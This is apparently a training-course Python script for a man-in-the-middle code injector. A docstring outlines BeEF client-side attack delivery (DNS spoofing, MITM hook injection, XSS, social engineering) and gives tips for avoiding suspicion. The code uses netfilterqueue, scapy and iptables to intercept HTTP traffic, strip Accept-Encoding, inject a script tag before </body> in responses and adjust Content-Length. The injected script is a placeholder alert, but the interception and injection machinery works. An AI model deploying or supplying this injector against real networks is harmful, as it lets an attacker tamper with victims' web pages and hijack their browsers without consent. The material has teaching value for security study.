'''
CLIENT SIDE ATTACKS: Beef Framework
    Get the target to run the beef command doing one of the following
        1)DNS Spoofing
        2)Inject the hook in browsed pages (need to be MITM)
        3)Use XSS exploit
        4)Social engineer the target to open a hook page
NOTE:
    1) html code is sent in the raw layer of the packet, it is usually compressed
    2) if we look at the http request packet, inside of raw layer there is an
        Accept-Encoding: ...some encoding.... , which tells us how the response
        raw layer is going to be compressed Ex) gzip
    3) If we remove the Accept-Encoding portion then the server will not encode the
        html in the response
    4) Regex in python by default looks for the biggest string to match (greedy)
    5) Regex => matching up to the first occurrence => specify non greedy
        Ex) *?n (This is a non-greedy *)
    6) Inject your js code after the last </body> tag, that way the page loads
        first and then your js code (avoids suspicion)
    7) Some html pages specify a "content length" inside of the header of the page,
        this specifies the size of the page, if the size of the page and the content
        length of the page don't match the browser wont load all of the page
    8) images and other types of data may have a content length, therefore
        we want to specify that we are only going to modify html pages
'''
import netfilterqueue
import subprocess
import scapy.all as scapy
import re

ack_list = []
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        #HTTP Request
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        #HTTP Response
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injection_code = "<script>alert('test');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
        #check if Raw.load got modified
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()  # forwards packet to destination

try:
    print("[+] Creating packet queue")
    #subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[-] Removing packet queue")
    subprocess.call(["iptables", "--flush"])